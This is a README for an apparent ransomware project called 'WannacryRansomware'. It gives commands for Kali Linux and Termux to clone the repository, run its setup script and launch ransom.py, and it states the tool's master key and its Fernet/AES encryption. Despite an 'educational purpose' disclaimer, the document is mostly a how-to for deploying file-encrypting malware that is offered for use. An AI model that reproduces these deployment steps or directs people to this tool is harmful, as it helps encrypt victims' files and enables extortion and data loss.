#DISCLAIMER: ONLY FOR EDUCATIONAL PURPOSE
###In case of windows, you can directly use it any editors (ex: pycharm)

##using kali linux


* Update and upgrade your machine
```bash
$ apt update && apt upgrade
```
* Clone project
```bash
$ git clone https://github.com/WIZARD00007/WannacryRansomware
```
* Installing requirements
```bash
$ cd WannacryRansomware
$ chmod +x setup.py
$ python3 setup.py 
```
* installing packages
``` bash
$ pip3 install -r requirements.txt
```
usage
```bash
$cd src
$ chmod + ransom.py
$ python3 ransom.py
```
##using termux

```

* Update and upgrade your machine
```bash
$ pkg install git
$ pkg update && pkg upgrade
```
* Clone project
```bash
$ git clone https://github.com/WIZARD00007/WannacryRansomware
```

```bash
$ cd WannacryRansomware
$ chmod +x setup.py
$ python3 setup.py 
```
* installing packages
``` bash
$ pip3 install -r requirements.txt
```
* usage
```bash
$cd src
$ chmod +x ransom.py
$ python3 ransom.py


NOTE: MASTER KEY IS wizzmagic
caution : Fernet is a symmetric encryption method which makes sure that the message ecrypted cannot br manipulated/read without the key. It uses URL safe encoding for the keys. Fernet also uses 128-bit AES.
If your changing directory make sure that it does not contain any important data.
